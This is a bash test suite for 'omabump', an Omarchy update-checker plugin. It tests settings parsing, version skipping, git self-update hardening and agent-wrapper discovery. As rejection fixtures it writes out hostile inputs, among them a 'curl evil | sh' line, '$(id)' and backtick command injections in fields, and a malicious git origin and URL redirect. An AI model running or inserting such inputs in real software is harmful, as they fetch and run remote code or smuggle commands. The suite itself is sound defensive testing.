# Every mise call runs with asdf and vfox disabled, so no plugin script runs.
mkdir -p "$scratch/fakebin"
# shellcheck disable=SC2016 # expanded by the fake mise, not here
printf '#!/bin/sh\necho "$MISE_DISABLE_BACKENDS|$PWD|$*"\n' >"$scratch/fakebin/mise"
chmod +x "$scratch/fakebin/mise"
same "mise_run: asdf and vfox disabled, in \$HOME" "asdf,vfox|$HOME|ls --json" "$(PATH=$scratch/fakebin:$PATH MISE_DATA_DIR=$scratch/no-mise-data real_mise_run ls --json)"
mkdir -p "$scratch/agebin"
# shellcheck disable=SC2016 # expanded by the fake mise, not here
printf '#!/bin/sh\necho "${MISE_MINIMUM_RELEASE_AGE-unset}"\n' >"$scratch/agebin/mise"
chmod +x "$scratch/agebin/mise"
same "mise_run: no release-age cooldown, as Omarchy runs mise" 0 \
  "$(PATH=$scratch/agebin:$PATH MISE_MINIMUM_RELEASE_AGE=7d real_mise_run ls)"
# A vfox backend plugin is disabled by its own name: every installed plugin
# directory is added, and a name with odd characters is not.
mkdir -p "$scratch/mise-data/plugins/foo" "$scratch/mise-data/plugins/vfox-bar" "$scratch/mise-data/plugins/x y" "$scratch/mise-data/plugins/.hidden"
same "mise_run: installed plugins disabled by name" "asdf,vfox,foo,vfox-bar|$HOME|ls --json" "$(PATH=$scratch/fakebin:$PATH MISE_DATA_DIR=$scratch/mise-data real_mise_run ls --json)"
same "mise: the allowed backends" 'aqua github gitlab forgejo npm http ubi pipx cargo' "${mise_safe_backends[*]}"
reset_mise
shipped_apps=$real_shipped
app_table=""

# --- mute and skip settings, read from shell.json ------------------------------------

shell_json=$scratch/shell.json
quiet() { load_quiet 2>/dev/null; echo "$muted_json $skipped_json"; }
cat >"$shell_json" <<'EOF2'
{"bar": {"layout": {"left": [{"id": "omarchy.menu", "mutedApps": ["nope"]}], "right": [
  {"id": "io.github.vladkarok.omabump", "mutedApps": ["mise:grok-cli", "claude-desktop", "../x", 7, "-y"],
   "skippedVersions": {"grok-bot": "0.66.0", "mise:grok-cli": "1.0.0-beta.1", "bad": "$(id)", "../x": "1", "n": 3}}]}}}
EOF2
same "load_quiet: the widget's entry in a bar.layout section, bad entries dropped" \
  '["claude-desktop","mise:grok-cli"] {"grok-bot":"0.66.0","mise:grok-cli":"1.0.0-beta.1"}' "$(quiet)"
same "load_quiet: each dropped string entry is named on stderr" 4 "$(load_quiet 2>&1 >/dev/null | grep -c '^ignoring')"
printf '{"bar": {"layout": {"center": []}}, "plugins": [{"id": "x"}, {"id": "io.github.vladkarok.omabump", "mutedApps": ["kimi-bin"], "skippedVersions": {"trae-bin": "1.2"}}]}' >"$shell_json"
same "load_quiet: the entry in the top-level plugins list" '["kimi-bin"] {"trae-bin":"1.2"}' "$(quiet)"
printf '{"bar": {"layout": {"right": [{"id": "io.github.vladkarok.omabump", "mutedApps": "a,b", "skippedVersions": ["x"]}]}}}' >"$shell_json"
same "load_quiet: settings of the wrong type are ignored" '[] {}' "$(quiet)"
printf '[1, 2]' >"$shell_json"
same "load_quiet: a file that is not an object" '[] {}' "$(quiet)"
printf 'not json' >"$shell_json"
same "load_quiet: a file that is not JSON" '[] {}' "$(quiet)"
{ printf '{"bar": {"layout": {"right": [{"id": "io.github.vladkarok.omabump", "mutedApps": ["a"]}]}}, "pad": "'; head -c 1048576 /dev/zero | tr '\0' x; printf '"}'; } >"$shell_json"
same "load_quiet: a file over 1 MiB is ignored" '[] {}' "$(quiet)"
same "load_quiet: and named on stderr" 1 "$(load_quiet 2>&1 >/dev/null | grep -c 'larger than 1 MiB')"
jq -n '{bar: {layout: {right: [{id: "io.github.vladkarok.omabump", mutedApps: [range(300) | "app\(.)"],
  skippedVersions: ([range(300) | {key: "app\(.)", value: "1.\(.)"}] | from_entries)}]}}}' >"$shell_json"
same "load_quiet: at most 200 muted and 200 skipped entries" '200 200' "$(load_quiet 2>/dev/null; echo "$(jq length <<<"$muted_json") $(jq length <<<"$skipped_json")")"
rm -f "$shell_json"
same "load_quiet: no shell.json, nothing muted or skipped" '[] {}' "$(quiet)"

# --- notifications and skips ----------------------------------------------------

same "announce_action: a new version is sent" send "$(announce_action omarchy true '' false 1.1 1.0)"
same "announce_action: a version already announced is not" '' "$(announce_action omarchy true '' false 1.1 1.1)"
same "announce_action: a muted row records it without a notification" record "$(announce_action omarchy true '' true 1.1 '')"
same "announce_action: a muted row's recorded version stays quiet after unmuting" '' "$(announce_action omarchy true '' false 1.1 1.1)"
same "announce_action: a failed check announces nothing" '' "$(announce_action omarchy true 'feed failed' false 1.1 '')"
same "announce_action: no update, nothing" '' "$(announce_action omarchy false '' false 1.1 '')"
check "row_skipped: mise, the skipped version exactly" row_skipped mise true 1.0.99 1.0.99
refuse "row_skipped: mise, a different version string" row_skipped mise true 1.0.99 1.0.98
check "row_skipped: self, the skipped version exactly" row_skipped self true 0.2.0 0.2.0
refuse "row_skipped: self, another version" row_skipped self true 0.1.9 0.2.0
check "row_skipped: pacman, latest at the skipped version" row_skipped omarchy true 0.66.0 0.66.0
check "row_skipped: pacman, a rollback below the skipped version stays skipped (vercmp)" row_skipped omarchy true 0.66.0 0.67.0
refuse "row_skipped: pacman, a newer release lights the row up again" row_skipped omarchy true 0.68.0 0.67.0
refuse "row_skipped: no update, not skipped" row_skipped omarchy false 0.66.0 0.66.0
refuse "row_skipped: nothing skipped" row_skipped omarchy true 0.66.0 ''
same "skip: the skipped version is recorded, not notified" record "$(announce_action omarchy true '' true 0.66.0 '')"
same "skip: a newer release than the skipped one is notified once" send "$(announce_action omarchy true '' false 0.67.0 0.66.0)"
same "skip: and not again" '' "$(announce_action omarchy true '' false 0.67.0 0.67.0)"
# vercmp calls 1.0.0 and 1.0.0-beta.1 equal; mise rows compare strings.
refuse "skip: mise stable 1.0.0 is past the skipped 1.0.0-beta.1" row_skipped mise true 1.0.0 1.0.0-beta.1
same "skip: mise stable after a recorded beta is notified" send "$(announce_action mise true '' false 1.0.0 1.0.0-beta.1)"
same "skip: and only once" '' "$(announce_action mise true '' false 1.0.0 1.0.0)"
same "skip: a pacman rollback below the announced version announces nothing" '' "$(announce_action omarchy true '' false 0.66.0 0.67.0)"
# The installer's refresh runs omabump-check with no settings arguments: the
# skips still apply, since the checker reads them from shell.json.
printf '{"bar": {"layout": {"right": [{"id": "io.github.vladkarok.omabump", "skippedVersions": {"grok-bot": "0.67.0"}}]}}}' >"$shell_json"
load_quiet
check "skip: a check without arguments keeps a pacman skip across a feed rollback" \
  row_skipped omarchy true 0.66.0 "$(jq -r '.["grok-bot"]' <<<"$skipped_json")"
check "omabump-check takes no settings arguments" bash -c "! grep -q -- '--skipped\|--muted' '$root/bin/omabump-check' '$root/Main.qml'"
rm -f "$shell_json"
load_quiet

# --- Omabump's own row ---------------------------------------------------------------

check "app_id_ok: self:omabump" app_id_ok self:omabump
refuse "app_id_ok: another self: id" app_id_ok self:other
same "apps_table: a self: row from the user's file is dropped" '' \
  "$(printf '[{"pkg": "self:omabump", "source": "indicator"}]' >"$user_apps"; apps_table 2>/dev/null | jq -r '.[] | select(.pkg == "self:omabump") | .pkg')"
rm -f "$user_apps"
same "installed_app: the self row reads manifest.json" "self omabump $(jq -r .version "$root/manifest.json")" "$(installed_app "$self_app")"
echo '302 https://github.com/vladkarok/omabump/releases/tag/v0.2.0' >"$scratch/served/latest"
same "the self row's newest version from the release redirect" 0.2.0 "$(feed_version "$self_app")"
echo '404 ' >"$scratch/served/latest"
refuse "the self row: no release is a feed error" feed_version "$self_app"
rm -f "$scratch/served/latest"
real_plugins=$plugins_dir real_plugin_dir=$plugin_dir
plugins_dir=$scratch/plugins
mkdir -p "$plugins_dir"
ln -s "$root" "$plugins_dir/$self_plugin_id"
refuse "self_git_managed: a symlinked checkout is local" self_git_managed
rm "$plugins_dir/$self_plugin_id"
mkdir -p "$plugins_dir/$self_plugin_id"
plugin_dir=$plugins_dir/$self_plugin_id
refuse "self_git_managed: a copy without .git is local" self_git_managed
mkdir "$plugins_dir/$self_plugin_id/.git"
check "self_git_managed: a git clone omarchy plugin add made" self_git_managed
plugin_dir=$real_plugin_dir
refuse "self_git_managed: only when it is the copy running" self_git_managed
plugins_dir=$real_plugins

# The release fast-forward, against a local bare repository. Production git
# allows only https; the test's self_git also allows file:// and nothing else
# changes. A user's git config could rewrite URLs, so it is left out.
export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1
tgit() { git -c user.name=t -c user.email=t@example.com -c init.defaultBranch=main -c advice.detachedHead=false "$@" >/dev/null 2>&1; }
eval "$(declare -f self_git | sed '1s/^self_git/real_self_git/')"
self_git() { git -c protocol.file.allow=always -C "$plugin_dir" "$@" </dev/null; }
tgit init -q --bare "$scratch/self.git"
tgit clone -q "$scratch/self.git" "$scratch/self-work"
for c in one two three; do
  echo "$c" >"$scratch/self-work/$c"
  tgit -C "$scratch/self-work" add "$c"
  tgit -C "$scratch/self-work" commit -q -m "feat: $c"
  case $c in one) tgit -C "$scratch/self-work" tag v0.1.0 ;; two) tgit -C "$scratch/self-work" tag -a -m 0.2.0 v0.2.0 ;; esac
done
tgit -C "$scratch/self-work" push -q origin main v0.1.0 v0.2.0
tgit clone -q "$scratch/self.git" "$scratch/self-clone"
tgit -C "$scratch/self-clone" reset -q --hard v0.1.0
plugin_dir=$scratch/self-clone
self_plan 0.2.0 2>/dev/null
same "self_plan: the target is the tagged commit, not the branch head" "$(git -C "$scratch/self-work" rev-parse 'v0.2.0^{commit}')" "$self_target"
same "self_plan: the log shows only the release's commits" 'feat: two' "$(git -C "$plugin_dir" log --format=%s "HEAD..$self_target")"
same "self_plan: only the tag was fetched" 1 "$(grep -c . "$plugin_dir/.git/FETCH_HEAD")"
same "self_plan: nothing moved before the answer" "$(git -C "$scratch/self-work" rev-parse v0.1.0)" "$(git -C "$plugin_dir" rev-parse HEAD)"
echo dirty >"$plugin_dir/one"
same "self_plan: local changes refuse" 'local changes' "$(self_plan 0.2.0 2>&1 | grep -o 'local changes')"
tgit -C "$plugin_dir" checkout -q -- one
refuse "self_plan: a tag that does not exist" self_plan 0.9.0
tgit -C "$plugin_dir" reset -q --hard main
tgit -C "$plugin_dir" merge -q --ff-only origin/main
same "self_plan: a tag behind the installed commit is not a fast-forward" 'not a fast-forward' "$(self_plan 0.2.0 2>&1 | grep -o 'not a fast-forward')"
refuse "self_plan: an odd version never reaches git" self_plan '0.2.0:refs/heads/x'
self_git() { git -C "$plugin_dir" "$@" </dev/null; }
for url in https://github.com/vladkarok/omabump https://GitHub.com/VladKarok/Omabump.git; do
  tgit -C "$plugin_dir" remote set-url origin "$url"
  check "self_origin_ok: $url" self_origin_ok
done
for url in https://github.com/evil/omabump git@github.com:vladkarok/omabump.git https://github.com/vladkarok/omabump.git.evil "$scratch/self.git"; do
  tgit -C "$plugin_dir" remote set-url origin "$url"
  refuse "self_origin_ok: $url" self_origin_ok
done
tgit -C "$plugin_dir" remote set-url origin https://github.com/vladkarok/omabump
tgit -C "$plugin_dir" config url."https://example.com/".insteadOf https://github.com/
refuse "self_origin_ok: an insteadOf that redirects the canonical url" self_origin_ok
unset GIT_CONFIG_GLOBAL GIT_CONFIG_NOSYSTEM
eval "$(declare -f real_self_git | sed '1s/^real_self_git/self_git/')"
self_def=$(declare -f self_git)
# shellcheck disable=SC2016 # the literal text of the definition
check "self_git: hardened like pgit, https only, bounded" test -n "$([[ $self_def == *'timeout -k 10 120 env GIT_ALLOW_PROTOCOL=https GIT_TERMINAL_PROMPT=0 git "${git_safe[@]}"'* ]] && echo y)"
check "the installer no longer runs omarchy plugin update" bash -c "! grep -q 'cmd=(omarchy plugin update' '$root/bin/omabump-install'"
plugin_dir=$real_plugin_dir

# --- omabump-discover ----------------------------------------------------------

disc=$scratch/discover
mkdir -p "$disc/bin"
discover() { python3 "$root/bin/omabump-discover" --stock "$disc/stock.jsonc" --user "$disc/user.jsonc" --bin-dir "$disc/bin" "$@"; }
agents() { discover "$@" | jq -r '.agents | map("\(.command)=\(.key)/\(.source)") | join(" ")'; }
wrapper() { printf '#!/bin/bash\nexport MISE_MINIMUM_RELEASE_AGE=0\nmise use -g --quiet "%s" || exit 1\nexec mise x "%s" -- "%s" "$@"\n' "$2" "${3:-$2}" "$1"; }
cat >"$disc/stock.jsonc" <<'EOF2'
{
  // A comment, and one with a URL: https://example.com
  "setup.default.agent": {"label": "Agent"},
  "setup.default.agent.claude": {"label": "Claude", "action": "omarchy-default-agent claude", /* inline */},
  "setup.default.agent.muse": {"label": "Muse // not a comment", "description": "https://example.com/x"},
  "setup.default.agent.omp": {"label": "omp"},
  "setup.default.agent.claude.extra": {"label": "Nested"},
  "setup.default.agent.Bad": {"label": "Upper case"},
  "setup.default.agent.nolabel": {"icon": "x"},
  "other.agent.x": {"label": "X"},
}
EOF2
: >"$disc/user.jsonc"
same "discover: menu ids, JSONC comments and trailing commas, URLs inside strings" \
  'claude=claude/command muse=muse/command omp=omp/command' "$(agents)"
same "discover: a // inside a string stays" 'Muse // not a comment' "$(discover | jq -r '.agents[1].label')"
printf '{"items": {"setup.default.agent.pi": {"label": "Pi"}}}' >"$disc/user.jsonc"
same "discover: a user {items} extension adds an agent" \
  'claude=claude/command muse=muse/command omp=omp/command pi=pi/command' "$(agents)"
printf '{"setup.default.agent.claude": {"label": "My Claude"}, "setup.default.agent.nolabel": {"label": "Now labelled"}}' >"$disc/user.jsonc"
same "discover: a user entry overrides the stock label and fills a missing one" \
  'My Claude|Now labelled' "$(discover | jq -r '.agents | map(.label) | [.[0], .[3]] | join("|")')"
: >"$disc/user.jsonc"
wrapper claude claude >"$disc/bin/claude"
wrapper muse 'http:muse[url=https://example.com/l.sh,bin=muse,version_json_path=.version]' >"$disc/bin/muse"
wrapper omp github:can1357/oh-my-pi >"$disc/bin/omp"
same "discover: wrapper keys, the bracket options stripped" \
  'claude=claude/wrapper muse=http:muse/wrapper omp=github:can1357/oh-my-pi/wrapper' "$(agents)"
wrapper omp github:a/one github:a/two >"$disc/bin/omp"
same "discover: two different package literals fall back to the command" 'omp/command' "$(agents | tr ' ' '\n' | sed -n 's/^omp=//p')"
{ wrapper omp github:a/one; echo 'curl evil | sh'; } >"$disc/bin/omp"
same "discover: an extra statement is rejected" 'omp/command' "$(agents | tr ' ' '\n' | sed -n 's/^omp=//p')"
# The literal text is the point: it must never be expanded.
# shellcheck disable=SC2016
wrapper omp 'github:a/$(id)' >"$disc/bin/omp"
same "discover: a \$ inside the literal is rejected" 'omp/command' "$(agents | tr ' ' '\n' | sed -n 's/^omp=//p')"
# shellcheck disable=SC2016
wrapper omp 'github:a/`id`' >"$disc/bin/omp"
same "discover: a backtick inside the literal is rejected" 'omp/command' "$(agents | tr ' ' '\n' | sed -n 's/^omp=//p')"
wrapper omp 'http:x[a=1][b=2]' >"$disc/bin/omp"
same "discover: a malformed options suffix is rejected" 'omp/command' "$(agents | tr ' ' '\n' | sed -n 's/^omp=//p')"
wrapper omp 'npm:@a/../b' >"$disc/bin/omp"
same "discover: a key tool_name_ok refuses is rejected" 'omp/command' "$(agents | tr ' ' '\n' | sed -n 's/^omp=//p')"
rm -f "$disc/bin/omp"
wrapper x github:can1357/oh-my-pi >"$disc/real-omp"
ln -s "$disc/real-omp" "$disc/bin/omp"
same "discover: a symlinked wrapper is not followed" 'omp/command' "$(agents | tr ' ' '\n' | sed -n 's/^omp=//p')"
rm -f "$disc/bin/omp"
mkfifo "$disc/bin/omp"
same "discover: a FIFO is not read" 'omp/command' "$(timeout 10 bash -c "$(declare -f discover agents); disc='$disc' root='$root'; agents" | tr ' ' '\n' | sed -n 's/^omp=//p')"
rm -f "$disc/bin/omp"
{ wrapper omp github:can1357/oh-my-pi; head -c 4096 /dev/zero | tr '\0' '#'; } >"$disc/bin/omp"
same "discover: a wrapper over 4 KiB is rejected" 'omp/command' "$(agents | tr ' ' '\n' | sed -n 's/^omp=//p')"
wrapper omp github:can1357/oh-my-pi >"$disc/bin/omp"
same "discover: a wrapper owned by another uid is rejected" 'omp/command' \
  "$(agents --uid "$(( $(id -u) + 1 ))" | tr ' ' '\n' | sed -n 's/^omp=//p')"
same "discover: --debug says why" 'omabump-discover: omp: not owned by uid' \
  "$(discover --debug --uid "$(( $(id -u) + 1 ))" 2>&1 >/dev/null | grep -o '^omabump-discover: omp: not owned by uid')"
errors_of() { discover | jq -r '(.errors + [.agents[].warning | strings]) | join("|")'; }
wrapper omp github:can1357/oh-my-pi >"$disc/bin/omp"
wrapper omp github:can1357/oh-my-pi | sed '1a echo a line no wrapper has' >"$disc/bin/omp"
same "discover: a wrapper script that exists but is rejected is a warning" \
  "wrapper $disc/bin/omp not recognised: line 2 is not a line of an omarchy-mise-install wrapper" "$(HOME=/nonexistent errors_of)"
same "discover: and the agent still falls back to its command" 'omp/command' "$(agents | tr ' ' '\n' | sed -n 's/^omp=//p')"
same "discover: the home directory shows as ~" "wrapper ~/bin/omp not recognised: line 2 is not a line of an omarchy-mise-install wrapper" \
  "$(HOME=$disc errors_of)"
printf '\x7fELF\x02\x01\x01' >"$disc/bin/omp"
same "discover: a binary in its place is silent" '' "$(errors_of)"
rm -f "$disc/bin/omp"; ln -s "$disc/real-omp" "$disc/bin/omp"
same "discover: a symlink in its place is silent" '' "$(errors_of)"
rm -f "$disc/bin/omp"
same "discover: a missing wrapper is silent" '' "$(errors_of)"
# Whether a rejected file runs mise is read as shell: a here-document's body
# is data (an apostrophe in it opens no string), text that ends inside a
# quote or a here-document is also read line by line, and exec, sudo, env,
# nice and timeout may come by path and carry options.
mise_warning() {
  printf '%s\n' '#!/bin/bash' "$@" >"$disc/bin/omp"
  discover | jq -r '.agents[] | select(.command == "omp") | if .warning then "warned" else "silent" end'
}
# shellcheck disable=SC2016 # the literal text of the script
x='exec mise x "a" -- "omp" "$@"'
same "discover: mise after an apostrophe in a here-document warns" warned "$(mise_warning 'cat <<EOF' "don't" EOF "$x")"
same "discover: and after <<-EOF with tabs" warned "$(mise_warning 'cat <<-EOF' $'\tit\'s' $'\tEOF' "$x")"
same "discover: and after <<'EOF'" warned "$(mise_warning "cat <<'EOF'" "it's" EOF "$x")"
same "discover: and after <<\"EOF\" with a \" in the body" warned "$(mise_warning 'cat <<"EOF"' 'say "hi' EOF "$x")"
same "discover: mise in a here-document's body is data, even fed to bash" silent "$(mise_warning "bash <<'EOF'" "$x" EOF)"
same "discover: a here-string is no here-document" warned "$(mise_warning 'cat <<<EOF' "$x" EOF)"
# shellcheck disable=SC2016 # the literal text of the script
same "discover: an arithmetic << without a delimiter line falls back to each line" warned "$(mise_warning 'n=$((1<<2))' "$x")"
same "discover: a quote left open falls back to each line" warned "$(mise_warning "echo it's" "$x")"
same "discover: \$'...' ends at a ' no backslash quotes" warned "$(mise_warning "echo \$'it\\'s'" "$x" "echo \\'")"
for line in 'sudo -E mise use -g "a"' 'env -i PATH=/usr/bin mise use -g "a"' '/usr/bin/env mise use -g "a"' \
  "exec /usr/bin/nice -n 19 ${x#exec }" '/usr/bin/timeout 60 mise use -g "a"' 'timeout -s KILL -k 5 1m mise use -g "a"' \
  'sudo -u root mise use -g "a"' "exec -a omp ${x#exec }"; do
  same "discover: $line warns" warned "$(mise_warning "$line")"
done
for line in 'sudo -E echo "mise use -g a"' "nice -n 5 echo 'mise x a'" 'command -v mise >/dev/null || exit 1'; do
  same "discover: $line is silent" silent "$(mise_warning "$line")"
done
# A runner's options, their values and numbers each read one way, so a long
# run of them that runs nothing cannot make the match backtrack.
t0=$(date +%s%N)
same "discover: 40 runner options that run nothing are silent" silent \
  "$(mise_warning "$(printf 'sudo -E -u x env -i -/env 1 %.0s' {1..40})echo" "$(printf 'exec -a %.0s' {1..40})y")"
ms=$(( ($(date +%s%N) - t0) / 1000000 ))
check "discover: and are read within a second ($ms ms)" test "$ms" -lt 1000
wrapper omp github:can1357/oh-my-pi >"$disc/bin/omp"
printf '{"setup.default.agent.zed\\n": {"label": "Trailing newline"}, "setup.default.agent.pi": {"label": "Pi"}}' >"$disc/user.jsonc"
same "discover: a menu id must match whole, no trailing newline" 'pi' \
  "$(discover | jq -r '[.agents[] | select(.command == "zed" or .command == "pi") | .command] | join(" ")')"
printf '{"setup.default.agent.claude": {"label": "Cl\\u202eau\\u200bde\\u0007  Code\\n\\t x"}, "setup.default.agent.muse": {"label": "%s"}, "setup.default.agent.pi": {"label": "\\u200b\\u2066"}}' \
  "$(printf 'M%.0s' {1..100})" >"$disc/user.jsonc"
same "discover: labels lose control and format characters, whitespace collapsed" 'Claude Code x' "$(discover | jq -r '.agents[] | select(.command == "claude") | .label')"
same "discover: labels stop at 64 characters" 64 "$(discover | jq -r '.agents[] | select(.command == "muse") | .label | length')"
same "discover: a label that is nothing but format characters drops the agent" '' "$(discover | jq -r '.agents[] | select(.command == "pi") | .command')"
jq -n '[range(100) | {key: "setup.default.agent.a\(.)", value: {label: "A\(.)"}}] | from_entries' >"$disc/user.jsonc"
same "discover: at most 64 agents" 64 "$(discover | jq '.agents | length')"
rm -f "$disc/user.jsonc"; mkfifo "$disc/user.jsonc"
same "discover: a menu FIFO is refused without waiting for a writer" 'not a regular file' \
  "$(timeout 5 python3 -I "$root/bin/omabump-discover" --stock "$disc/stock.jsonc" --user "$disc/user.jsonc" --bin-dir "$disc/bin" | jq -r '.errors[]' | grep -o 'not a regular file')"
rm -f "$disc/user.jsonc"; printf '{}' >"$disc/menu-target"; ln -s "$disc/menu-target" "$disc/user.jsonc"
same "discover: a symlinked menu is followed" '' "$(errors_of)"
# Root's files are always accepted (the stock menu is root's), so as root, as
# in the CI container, every fixture passes the owner check by design.
if (( $(id -u) == 0 )); then
  pass "discover: a menu owned by another user is refused (skipped as root)"
else
  same "discover: a menu owned by another user is refused" 'not owned by uid' \
    "$(discover --menu-uid "$(( $(id -u) + 1 ))" | jq -r '.errors[0]' | grep -o 'not owned by uid')"
fi
rm -f "$disc/user.jsonc"; : >"$disc/user.jsonc"
# shellcheck disable=SC2016 # the literal text of the script
check "discovery runs python3 isolated" grep -q 'python3 -I "$plugin_dir/bin/omabump-discover"' "$root/bin/omabump-common"
check "the installer prints labels through term_safe" grep -q "^label=.*| term_safe" "$root/bin/omabump-install"
echo '{"setup.default.agent.claude": {"label": "Claude"' >"$disc/stock.jsonc"
same "discover: a malformed menu is an error and no agents" '1 0' "$(discover | jq -r '"\(.errors | length) \(.agents | length)"')"
rm -f "$disc/stock.jsonc"
same "discover: a missing menu is an error" 'no Omarchy menu at' "$(discover | jq -r '.errors[0]' | grep -o '^no Omarchy menu at')"
check "omabump-discover compiles" env PYTHONPYCACHEPREFIX="$scratch/pycache" python3 -m py_compile "$root/bin/omabump-discover"

# --- the shipped apps.json and pins.json --------------------------------------

check "apps.json is a JSON array" jq -e 'type == "array"' "$root/apps.json"
same "apps.json has no command feeds" 0 "$(jq '[.[] | select(.feed.type == "command")] | length' "$root/apps.json")"
same "apps.json sets no _userFeed" 0 "$(jq '[.[] | select(has("_userFeed"))] | length' "$root/apps.json")"
same "every pkg in apps.json is unique" '[]' "$(jq -c 'map(.pkg) | group_by(.) | map(select(length > 1) | .[0])' "$root/apps.json")"
vendor_ok=1
while IFS= read -r app; do vendor_checksum_declared "$app" || vendor_ok=0; done < <(jq -c '.[] | select(.source == "vendor-pkg")' "$root/apps.json")
check "every vendor-pkg in apps.json names a checksum source" test "$vendor_ok" = 1
check "pins.json pins a 40-hex commit" jq -e '.omarchyPkgs.commit | test("^[0-9a-f]{40}$")' "$root/pins.json"
# Omarchy's lazy wrappers (omarchy-mise-install) call `mise use -g <name>`;
# the key mise ls reports is that name, so the table must carry it.
for t in claude codex crush opencode grok copilot cursor-agent pi github:can1357/oh-my-pi; do
  # $t inside the single quotes is jq's variable, not the shell's.
  # shellcheck disable=SC2016
  check "apps.json tracks Omarchy's mise tool $t" jq -e --arg t "$t" 'any(.[]; .source == "mise" and ([.tool] | flatten | index($t)))' "$root/apps.json"
done
mise_ls_json='{"grok":[{"version":"1.0.46","installed":true,"active":true}]}'
same "the Grok CLI row finds mise's first-party grok" "grok 1.0.46" "$(mise_active "$(app_json mise:grok-cli)")"
mise_ls_json='{}'

source "$root/tests/qml.sh"
source "$root/tests/check.sh"
source "$root/tests/install.sh"
if (( failed )); then
  echo "$failed of $n tests failed"
  exit 1
fi
echo "all $n tests passed"
